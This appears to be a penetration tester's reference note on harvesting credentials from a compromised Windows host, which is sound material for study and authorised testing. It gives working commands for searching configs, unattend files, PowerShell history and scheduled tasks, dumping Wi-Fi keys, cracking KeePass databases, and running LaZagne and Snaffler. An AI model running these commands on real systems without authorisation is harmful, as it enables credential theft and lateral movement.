---
created: 2026-07-19
updated: 2026-10-10
tags:
  - Windows
  - Windows_PrivEsc
status: complete
---

> [!abstract]+ **Scope**: Passive and active local Windows credential harvesting techniques across configuration files, shell history, registry entries, stored vaults, database files, Group Policy, network shares, and memory artifacts.

## Windows credential hunting

- Credential hunting is a primary post-exploitation activity after obtaining initial access. Many techniques are passive (reading files, querying registry keys) and generate minimal log noise.


- After gaining initial access, credential hunting is typically one of the **first post-exploitation activities**.

> [!tip] Many credential hunting techniques are **passive** (reading files, querying the registry) and produce minimal noise. Others (like LSASS dumping) are noisy and should be used judiciously.

- What to search for:
	- **Plaintext passwords**
	- **NTLM hashes** and **Kerberos tickets**
	- **Encryption keys** (DPAPI master keys, AES keys, SSH private keys)
	- **API keys** and **tokens** (OAuth, JWT, cloud provider keys)
	- **Usernames** paired with hosts or domains
	- **Database connection strings** and credentials
	- **Certificate files** (`.pfx`, `.pem`, `.p12`) and their passwords

- Where to look:
	- **Configuration files** — `web.config`, `app.config`, `unattend.xml`, `sysprep.xml`, IIS configurations.
	- **Shell history** — PowerShell `PSReadLine`, `cmd.exe` `DOSKEY`, PowerShell transcripts.
	- **Windows Credential Manager** — vaults and credential blobs.
	- **Registry** — `AutoLogon`, PuTTY sessions, RDP history, VNC passwords.
	- **Scheduled tasks and services** — stored `runas` credentials.
	- **Database files** — KeePass (`.kdbx`), browser SQLite stores (`.sqlite`), Sticky Notes.
	- **Group Policy / `SYSVOL`** — GPP passwords, logon scripts.
	- **Wi-Fi profiles** — plaintext PSKs.
	- **`SAM` / `SYSTEM` / `SECURITY` hives** — local account hashes.
	- **LSASS memory** — cached credentials for logged-in users.
	- **DPAPI** — Credential Manager blobs, browser passwords, certificates.
	- **Network shares** — scripts, documents, configuration files with hardcoded credentials.
	- **PowerShell profiles** — embedded credentials in `profile.ps1`.
	- **Event logs** — passwords in logged commands.
	- **Memory dump files** — `pagefile.sys`, `hiberfil.sys`.

- Key tools:
	- **Windows search**

## Searching configuration files

- Applications often store credentials in plaintext (or weakly encoded) within configuration files. This is especially common in IIS web applications, .NET apps, and unattended Windows installations.

- Search for passwords in configuration files:

```powershell
findstr /sim /C:"password" *.txt *.ini *.cfg *.config *.xml
```

- Using PowerShell to search configuration files with context:

```powershell
Get-ChildItem -Path C:\ -Include *.config,*.xml -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password|connectionString|apikey|secret" -SimpleMatch
```
### `web.config` files

>[`web.config`](https://learn.microsoft.com/en-us/aspnet/core/host-and-deploy/iis/web-config) is an XML configuration file used by IIS to configure web applications.

- `web.config` may contain elements with database credentials, API keys, or user passwords. 
- The default IIS website configuration is found at `C:\inetpub\wwwroot\web.config`.

>[!info] `C:\inetpub\wwwroot` is the default IIS web root.

---
- Search for all `web.config` files on the system:

```powershell
Get-ChildItem -Path C:\ -Include web.config -Recurse -ErrorAction SilentlyContinue
```

```powershell
where /R C:\ web.config
```

- Read the file and look for credentials:

```powershell
type C:\inetpub\wwwroot\web.config
```

- Search for credential keywords in `.config` files:

```powershell
findstr /SIM /C:"password" *.config
```

- It's a good idea to search for other files in `C:\inetpub\wwwroot`, such as `connectionstrings.config`.

```powershell
dir C:\inetpub\wwwroot
```

>[!note] `connectionstrings.config` is an external configuration file that stores database connection strings separately from the main `web.config` (or `App.config`) file; it's used in .NET applications. 

> [!not]+ The .NET framework also installs a machine-level `web.config` at `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config`. It's less commonly checked but may contain inherited connection strings.

>[!note] See [`web.config file — Microsoft Learn`](https://learn.microsoft.com/en-us/aspnet/core/host-and-deploy/iis/web-config?view=aspnetcore-10.0) and [`Connection strings and configuration files — Microsoft Learn`](https://learn.microsoft.com/en-us/dotnet/framework/data/adonet/connection-strings-and-configuration-files).
### IIS configuration

- IIS global configuration file is stored at `C:\Windows\System32\inetsrv\config\applicationHost.config`.

```powershell
type C:\Windows\System32\inetsrv\config\applicationHost.config
```

- This file may contain application pool identities, virtual directory credentials, and other IIS-specific configuration.
### `App.config` and connection strings

- .NET applications use `App.config` or `application.config` files for configuration:

```powershell
findstr /sim "connectionString" *.config *.xml *.cs *.csproj
```

### Unattended installation files

> **Unattended installation files** are XML configuration scripts that automate Windows setup by providing predefined answers to installation prompts. 

- Although these files should be automatically deleted as part of the installation, administrators may back them up somewhere in the filesystem during image development.
- They may contain, for example, local administrator credentials or other sensitive information.
---
- Common names of unattended installation files:
	- `Unattend.xml`
	- `autounattend.xml`
	- `sysprep.xml`
	- `sysprep.inf`

- Common locations:
	- `C:\Windows\Panther\`
	- `C:\Windows\Panther\Unattend\`
	- `C:\Windows\System32\Sysprep\`
	- `C:\Unattend.xml`
	- `C:\sysprep\`

- Search for all unattended installation files:

```powershell
Get-ChildItem -Path C:\ -Include *unattend*,*sysprep* -Recurse -ErrorAction SilentlyContinue
```

```powershell
dir /s /b C:\Windows\Panther\*.xml C:\Windows\System32\Sysprep\*.xml 2>nul
```

```powershell
dir /s /b unattend.xml sysprep.xml sysprep.inf autounattend.xml 2>nul
```

>[!example]-
> ```powershell
> Get-ChildItem -Path C:\ -Include *unattend*,*sysprep* -Recurse -ErrorAction SilentlyContinue
> ```
> 
> ```powershell
>     Directory: C:\Windows\Panther
> 
> 
> Mode                LastWriteTime         Length Name
> ----                -------------         ------ ----
> d-----        10/6/2021   3:37 PM                UnattendGC
> -a----         4/1/2022   8:08 AM           2357 unattend.xml
> ```

- Read the file and extract credentials:

```powershell
type C:\Windows\Panther\Unattend.xml
```

```powershell
type C:\Windows\System32\Sysprep\sysprep.xml
```

> [!tip]+ Look for the `<AutoLogon>` section — it often contains a `<Password><Value>` element with the local administrator password — in **plaintext** or **Base64-encoded**.
> ```xml
> <AutoLogon>
>   <Password>
>     <Value>SuperSecretPass</Value>
>     <PlainText>true</PlainText>
>   </Password>
> </AutoLogon>
> ```
> - If the password is Base64-encoded (`PlainText` is `false`), decode it with:
> ```powershell
> [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("Base64string"))
> ```

> [!note] Sysadmins sometimes create copies of these files during image development and forget to delete them. Always search the entire drive — not just the standard locations.

## PowerShell and command-line history

### `PSReadLine` persistent history

- Starting with PowerShell 5.0 (Windows 10+), persistent PowerShell command history is maintained by the `PSReadLine` module.
- By default, persistent PowerShell history is stored the `ConsoleHost_history.txt` file at:

```text
C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

- This file survives across sessions and often contains credentials entered as plaintext commands (e.g., `net use \\server\share /user:admin passwd123`).
---

- Confirm the location of the persistent PowerShell command history file: 

```powershell
(Get-PSReadLineOption).HistorySavePath
```

- Output the current user's PowerShell history:

```powershell
Get-Content (Get-PSReadLineOption).HistorySavePath
```

```powershell
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

- Search history for commands with plain-text credentials:

```powershell
Select-String -Path (Get-PSReadLineOption).HistorySavePath -Pattern "password|ConvertTo-SecureString|PSCredential|net use|Invoke-Command"
```

- Output all PowerShell history files accessible to the current user:

```powershell
foreach ($user in ((Get-ChildItem C:\Users).FullName)) {
    Get-Content "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue
}
```

> [!important] `PSReadLine` stores persistent command history; `Get-History`, `Invoke-History`, and `Clear-History` only cover **the current PowerShell session command history**, which is deleted when you exit. 

>[!Important] `PSReadLine` only records commands entered **interactively** — commands from scripts are not saved. Additionally, history is saved **after** the command completes, not before.

### PowerShell transcripts

>**PowerShell transcripts** are text-based logs that record **all input commands and console output** during a session.

- These are created by the `Start-Transcript` cmdlet or enabled by a Group Policy.
- Just like history files, transcripts may contain credentials and other sensitive data.
---
- Check for transcription logs:

```powershell
Get-ChildItem -Path C:\Users -Include *.log,*.txt -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.Name -like "PowerShell_transcript*" }
```

```powershell
dir /s /b C:\Users\*PowerShell_transcript*.txt 2>nul
```

- Common transcript paths (configured via Group Policy):

```text
C:\Users\<user>\Documents\
C:\Windows\Debug\
```

- Also check the Group Policy setting for the output path:

```powershell
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" /v OutputDirectory 2>nul
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" /v EnableTranscripting 2>nul
```

### `cmd.exe` history

- `cmd.exe` does not persist command history to disk by default — [`doskey`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/doskey) history only covers the current session:

```cmd
doskey /history
```

- However, the registry can be configured to log all `cmd.exe` commands via the **`Module Logging`** or **`Process Creation`** audit policies. These show up in the Windows Event Log (Event ID **`4688`** with command-line logging enabled).

>[!note] See the [[#Event logs and command-line auditing]] section.
## Windows credential manager

> **Windows Credential Manager** is a built-in Windows subsystem designed to securely store usernames, passwords, and certificates for websites, applications, and network resources.

- Credentials are stored in DPAPI-encrypted vault blobs on disk.
- Full enumeration (`cmdkey /list`, `vaultcmd /list`, `/listcreds:`, `/listproperties:`), `runas /savedcred` abuse, Mimikatz (`sekurlsa::credman`, `vault::cred`), SharpDPAPI, and LaZagne live in [[🛠️ Credential Manager]].
- For DPAPI master key handling see [[🛠️ DPAPI credentials]] and [[SeDebugPrivilege]].
## Registry credentials

- The Windows registry stores connection details, session information, and sometimes plaintext passwords.
- Full AutoLogon, PuTTY, RDP, VNC, SNMP, and broad `reg query` password searches live in Group Policy Preferences (GPP) & Registry.
- `SAM`, `SYSTEM`, and `SECURITY` hive extraction lives in [[Dumping Windows registry hives]].

## Scheduled tasks and services

### Scheduled task credentials

- Windows scheduled tasks can be configured to run under a specific user account with stored credentials. The task XML files may contain plaintext passwords or at least reveal which privileged accounts are used.

---

- List all scheduled tasks:

```powershell
Get-ScheduledTask | Format-Table TaskName, TaskPath, RunAs, RunLevel, State
```

- Find tasks running as `SYSTEM` or `Administrator`:

```powershell
Get-ScheduledTask | Where-Object { $_.Principal.UserId -match 'SYSTEM|Administrator' } | Format-Table TaskName, TaskPath, UserId
```

- Find tasks with stored credentials (`LogonType` = `Password`):

```powershell
Get-ScheduledTask | Where-Object { $_.Principal.LogonType -eq 'Password' } | Format-Table TaskName, UserId
```

- Output task XML files directly (may contain `<Password>` elements):

```powershell
dir /s /b C:\Windows\System32\Tasks\*.xml 2>nul
```

```powershell
type "C:\Windows\System32\Tasks\<TaskName>"
```

> [!tip] Look for `<LogonType>Password</LogonType>` combined with `<UserId>DOMAIN\Administrator</UserId>` — this indicates stored credentials for a privileged account.
### Service account credentials

- Services configured with a domain account as `LogOnAs` may have credentials stored:

```powershell
Get-WmiObject win32_service | Select-Object Name, StartName, PathName | Format-Table -AutoSize
```

```powershell
sc.exe qc <ServiceName>
```

- Check service binaries for hardcoded passwords (in scripts or configuration files):

```powershell
findstr /si password "C:\Program Files\*Service*"*.config *.xml
```

> [!note] Service account credentials are not stored in plaintext in the service configuration itself — they are stored in the LSA Secrets. However, if a service runs a script or binary that accepts a password as a command-line argument, that password may be visible in process listing or the command-line audit logs.

## Database files

### KeePass databases

- KeePass stores all passwords in an encrypted `.kdbx` database protected by a master password. If you can guess or crack the master password, you gain access to all stored credentials.

- Search for KeePass databases:

```powershell
dir /s /b *.kdbx 2>nul
```

```powershell
Get-ChildItem -Path C:\ -Include *.kdbx -Recurse -ErrorAction SilentlyContinue
```

- Also look for KeePass configuration files:

```powershell
dir /s /b *KeePass* 2>nul
```

- To crack a KeePass database, extract the hash and crack offline ([`keepass2john`](https://github.com/openwall/john/blob/bleeding-jumbo/src/keepass2john.c)):

```bash
keepass2john database.kdbx > hash.txt
```

```bash
hashcat -m 13400 hash.txt rockyou.txt
```

```bash
john --format=KeePass hash.txt
```

### Browser credential stores

- Chromium browsers store passwords in DPAPI-encrypted SQLite databases; Firefox uses `key4.db` / `logins.json`.
- Full store paths, `Local State` AES key handling, Mimikatz `dpapi::chrome`, SharpChrome, and SharpDPAPI workflows live in [[🛠️ DPAPI credentials]].
- Find browser credential files during hunting:

```powershell
dir /s /b "Login Data" "logins.json" "key4.db" "Cookies" 2>nul
```

## Group policy and SYSVOL


## Wi-Fi profiles

- Windows stores Wi-Fi profiles (including PSKs) on disk. 
- If the machine has connected to any wireless networks, you can recover the pre-shared keys.
---

- List saved Wi-Fi profiles:

```powershell
netsh wlan show profile
```

- Show all profiles with plaintext PSKs:

```powershell
netsh wlan show profile * key=clear
```

- Export all profiles to XML (includes `<keyMaterial>` with plaintext PSK):

```powershell
netsh wlan export profile folder=C:\Temp
```

- One-liner to dump all profile passwords:

```powershell
for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @netsh wlan show profiles name=%a key=clear
```

- Raw profile XML files on disk:

```text
C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\<interface_GUID>\
```

> [!note] `netsh wlan show profile * key=clear` requires **admin** to display the PSK in plaintext. Without admin, you can list profiles but the `Key Content` field is hidden.

>[!note] See [`Network shell (netsh) — Microsoft Learn`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh).

## Sticky Notes database

- Users often store passwords and sensitive notes in the Windows Sticky Notes app, not realizing it's a **plaintext SQLite database**.
- The sticky notes database is stored as `plum.sqlite` at `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`.

```text
C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite
```

- Find Sticky Notes databases:

```powershell
Get-ChildItem -Path C:\ -Include plum.sqlite* -Recurse -ErrorAction SilentlyContinue
```

- You can use [`PSSQLite`](https://github.com/RamblingCookieMonster/PSSQLite) to query the notes database:

```powershell
Import-Module .\PSSQLite.psd1
Invoke-SqliteQuery -Database 'C:\Users\user\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite' -Query "SELECT Text FROM Note" | ft -wrap
```

- Quick search without SQLite tools:

```powershell
Select-String -Path "C:\Users\user\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite" -Pattern "password" -SimpleMatch
```

- From Linux:

```bash
strings plum.sqlite-wal
```

> [!note] Notes are stored in the `Text` column of the `Note` table; users often store passwords and other sensitive data there.

## PowerShell profile files

- PowerShell profiles (`profile.ps1`) run automatically when a user opens PowerShell. 
- They may contain credentials, `ConvertTo-SecureString` calls, or connection strings for automation scripts.
---
- Find all PowerShell profile files:

```powershell
Get-ChildItem -Path C:\Users -Include *profile*.ps1 -Recurse -ErrorAction SilentlyContinue
```

```powershell
dir /s /b C:\Users\*\Documents\WindowsPowerShell\profile.ps1 2>nul
```

```powershell
dir /s /b "C:\Users\*\Documents\Windows PowerShell\Microsoft.PowerShell_profile.ps1" 2>nul
```

- Check for credentials in profiles:

```powershell
findstr /si password C:\Users\*\Documents\WindowsPowerShell\profile.ps1 2>nul
```

> [!note] There are **six** possible profile paths — per-user, per-host, all-users, and all-users-all-hosts. The most common one for credential hunting is the per-user profile:
> ```
> C:\Users\<user>\Documents\WindowsPowerShell\profile.ps1
> ```

## Environment variables

- Check for sensitive environment variables:

```powershell
set | findstr /i "pass"
set | findstr /i "key"
set | findstr /i "secret"
set | findstr /i "token"
set | findstr /i "cred"
```

- Also check for API keys and connection strings:

```powershell
set | findstr /i "api"
set | findstr /i "connection"
```

> [!note] Application-specific environment variables (e.g., `AWS_SECRET_ACCESS_KEY`, `AZURE_CLIENT_SECRET`) may be set per-user or per-service.

## `LaZagne`

> **[`LaZagne`](https://github.com/AlessandroZ/LaZagne)** is an open-source post-exploitation tool that retrieves stored credentials from a local system. It searches browsers, databases, chat applications, system configurations, Wi-Fi profiles, and more.

> [!note]- Installation
> ```bash
> wget https://github.com/AlessandroZ/LaZagne/releases/latest/download/LaZagne.exe
> ```


```powershell
# Run all modules
lazagne.exe all

# Specific categories
lazagne.exe browsers          # Browser passwords (Chrome, Firefox, Edge, Opera, etc.)
lazagne.exe windows           # Windows secrets (autologon, credman, hashdump, LSA secrets)
lazagne.exe mails             # Email client passwords
lazagne.exe databases         # Database client passwords
lazagne.exe wifi              # Wi-Fi passwords
lazagne.exe sysadmin          # SSH, WinSCP, VNC, OpenVPN, etc.
lazagne.exe chats             # Chat application passwords
```

- Verbose output:

```powershell
lazagne.exe all -vv
```

- Output to file:

```powershell
lazagne.exe all -oN output.txt
lazagne.exe all -oJ output.json
```



> [!important] Privileges needed:
> - **User-level**: Browsers, Git, chat clients, database clients, some Credential Manager entries
> - **Local admin**: Wi-Fi, LSA secrets, other users' Credential Manager entries, LSASS-related modules
> - `LaZagne` doesn't require `SYSTEM`, but it helps.

## `Snaffler` — share crawling

> **[`Snaffler`](https://github.com/SnaffCon/Snaffler)** crawls network shares across an Active Directory environment, looking for files with interesting extensions (`.kdbx`, `.vmdk`, `.vhdx`, `.ppk`, `.pfx`) and content (hardcoded passwords in scripts, `web.config` files, password documents).

- Full domain discovery:

```powershell
Snaffler.exe -s -d DOMAIN.LOCAL
```

- With output file:

```powershell
Snaffler.exe -s -o snaffler.log -d DOMAIN.LOCAL
```

- Target specific hosts:

```powershell
Snaffler.exe -s -n "DC01"
```

- Stealth mode (fewer connections):

```powershell
Snaffler.exe -s -i C:\
```

> [!tip] **Severity levels**: Black (critical), Red (high-value credentials), Yellow (potentially sensitive), Green (informational).
> - In practice, password files on share drives lead to initial access or privilege escalation on many engagements. User home directories on `\\FILESERVER\Users$\` are particularly fruitful.

## Event logs and command-line auditing

> Windows event logs may contain credentials if **command-line process creation auditing** is enabled (Event ID **4688**) or if **PowerShell Script Block Logging** captures sensitive commands.

- Search `Security` event log for command lines containing passwords:

```powershell
wevtutil qe Security "/q:*[System[(EventID=4688)]]" /f:text /rd:true /c:100 | findstr /i "password"
```

- Search PowerShell operational log for script blocks with credentials:

```powershell
wevtutil qe "Microsoft-Windows-PowerShell/Operational" "/q:*[System[(EventID=4104)]]" /f:text /rd:true /c:50 | findstr /i "password"
```

- Check if command-line auditing is enabled:

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit" /v ProcessCreationIncludeCmdLine_Enabled 2>nul
```

> [!note] This is especially useful in environments where `PSReadLine` history is disabled but command-line auditing is enforced by Group Policy.

## Other interesting files and locations

- Files that commonly contain credentials or sensitive data:

| File/Path | Description |
| --- | --- |
| `%SYSTEMDRIVE%\pagefile.sys` | Paged-out memory — may contain secrets from previously running processes |
| `%WINDIR%\debug\NetSetup.log` | Network setup log — may contain domain join credentials |
| `%WINDIR%\repair\sam` | Backup copy of the SAM database |
| `%WINDIR%\repair\system` | Backup copy of the SYSTEM hive |
| `%WINDIR%\repair\software` | Backup copy of the SOFTWARE hive |
| `%WINDIR%\repair\security` | Backup copy of the SECURITY hive |
| `%WINDIR%\system32\config\AppEvent.Evt` | Application event log (legacy format) |
| `%WINDIR%\system32\config\SecEvent.Evt` | Security event log (legacy format) |
| `%WINDIR%\system32\config\*.sav` | Registry hive save files |
| `%WINDIR%\system32\CCM\logs\*.log` | SCCM/ConfigMgr logs — may contain task sequences with embedded creds |
| `%USERPROFILE%\ntuser.dat` | Per-user registry hive — may contain PuTTY, RDP, and other app data |
| `%WINDIR%\System32\drivers\etc\hosts` | Hosts file — reveals internal network topology |
| `C:\ProgramData\Configs\*` | Common location for application configs |
| `C:\Program Files\Windows PowerShell\*` | PowerShell modules and scripts |

- Search for documents that might contain credentials:

```powershell
dir /s /b *.txt *.docx *.xlsx *.pdf *password* *cred* 2>nul
```

- Search for SSH keys:

```powershell
dir /s /b id_rsa* *.ppk 2>nul
```

- Search for virtual disk files (may contain offline SAM/SYSTEM):

```powershell
dir /s /b *.vmdk *.vhdx *.vhd 2>nul
```

- Search for certificate files:

```powershell
dir /s /b *.pfx *.pem *.p12 *.pfx* 2>nul
```

## References and further reading

- [`EoP - Looting for passwords, Windows — Internal All The Things`](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/#default-writable-folders)
- [`LaZagne — GitHub`](https://github.com/AlessandroZ/LaZagne)
- [`Snaffler — GitHub`](https://github.com/SnaffCon/Snaffler)
- [`Seatbelt — GitHub`](https://github.com/GhostPack/Seatbelt)
- [`SharpDPAPI — GitHub`](https://github.com/GhostPack/SharpDPAPI)
- [`Mimikatz — GitHub`](https://github.com/gentilkiwi/mimikatz)
- [`DPAPI secrets — The Hacker Recipes`](https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets)
- [`DPAPI — HackTricks`](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords.html)
- [`Password Hunting - Windows Privilege Escalation — Juggernaut Pentesting Academy`](https://juggernaut-sec.com/password-hunting/#Password_Hunting_%E2%80%93_IIS_Config_and_Web_Files)
- [`Windows Credential Manager — The Hacker Recipes`](https://www.thehacker.recipes/ad/movement/credentials/dumping/windows-credential-manager)
---

- [`web.config file — Microsoft Learn`](https://learn.microsoft.com/en-us/aspnet/core/host-and-deploy/iis/web-config?view=aspnetcore-10.0)
- [`Connection strings and configuration files — Microsoft Learn`](https://learn.microsoft.com/en-us/dotnet/framework/data/adonet/connection-strings-and-configuration-files)
- [`doskey — Microsoft Learn`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/doskey)
- [`cmdkey — Microsoft Learn`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey) 